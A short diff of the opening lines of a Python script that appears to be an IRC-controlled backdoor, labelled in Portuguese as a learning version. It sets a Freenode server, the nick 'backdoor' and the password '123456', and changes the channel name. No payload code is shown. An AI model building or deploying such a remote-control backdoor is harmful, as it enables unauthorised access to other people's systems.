@@ -1,6 +1,7 @@
 #! /usr/bin/env python
 #coding: utf-8
-
+#by: mHarcos Nesster 
+#versão para aprendizado!
 import time 
 import socket,os
 import sys
@@ -8,7 +9,7 @@ import random
 from re import search
 
 server =  "irc.freenode.net"
-canal = "#nesster"
+canal = "#canal"
 porta = 6667
 nick =  "backdoor"
 senha = "123456"
